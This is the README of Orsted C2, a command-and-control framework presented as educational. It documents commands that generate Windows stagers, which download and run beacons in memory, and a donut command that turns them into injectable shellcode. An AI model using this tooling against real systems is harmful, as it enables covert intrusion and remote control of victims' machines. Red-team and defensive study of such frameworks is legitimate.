# Orsted C2

![Orsted](orsted-homepage.png)

> **”They live as they please with that tiny pride of theirs and die because of a foolish enemy.”**  

Orsted C2 is a **C2 framework** created for educational purposes.

It consists of multiple **Orsted beacons** that communicate with each other and the main **Orsted server**. An operator can interact with the beacons using the **Orsted client**.

---

## Features

### Two-Stage Stager Delivery (NEW)

Generate minimal stagers (~50KB) that fetch and execute full beacons on-demand from the C2 server.

**Generate a stager:**
```bash
# Default (64-bit HTTP stager)
generate stager windows http 192.168.1.10:8080

# 32-bit HTTPS stager with proxy
generate stager windows https 192.168.1.10:443 -r 32 -t http -a 127.0.0.1:8080

# Options:
# -r, --arch: Target architecture (32 or 64, default: 64)
# -t, --http-proxy-type: Proxy type (http, https)
# -a, --http-proxy-address: Proxy address (IP:PORT)
# -u, --http-proxy-username: Proxy username
# -p, --http-proxy-password: Proxy password
```

**Output:**
- `stager_http_64.exe` — Windows x64 HTTP stager
- `stager_https_32.exe` — Windows x86 HTTPS stager

**How it works:**
1. Stager registers with C2 server (same protocol as full beacon)
2. Stager requests full agent binary from server
3. Server responds with download URL (`/agent/download/{beacon_id}?arch=64`)
4. Stager fetches and validates full beacon
5. Stager executes beacon in-memory (or disk)
6. Stager exits

**Use with donut:**
Convert stager to shellcode for injection workflows:
```bash
donut -i stager_http_64.exe -o stager_http_64.bin
```

---

## Documentation

For full details and setup instructions, check the **Orsted documentation**:

🌐 [Visit the Orsted Docs](https://almounah.github.io/orsted-doc/)


![Orsted](orsted.gif)

---

## 🔗 Quick Links

- **Orsted C2 code**: [GitHub Repository](https://github.com/almounah/orsted)  
- **Documentation source code**: [GitHub Docs](https://github.com/almounah/orsted-doc)  
- **Documentation site**: [Orsted Docs Site](https://almounah.github.io/orsted-doc/)  
- **Example usage**: [Orsted in Action](https://almounah.github.io/orsted-doc/intro/4-example-usage/)

---

## Tracking Changes

- **[CHANGELOG.md](CHANGELOG.md)** — Feature releases and updates
- **[FEATURE_STANDARD.md](FEATURE_STANDARD.md)** — How to add and document new features

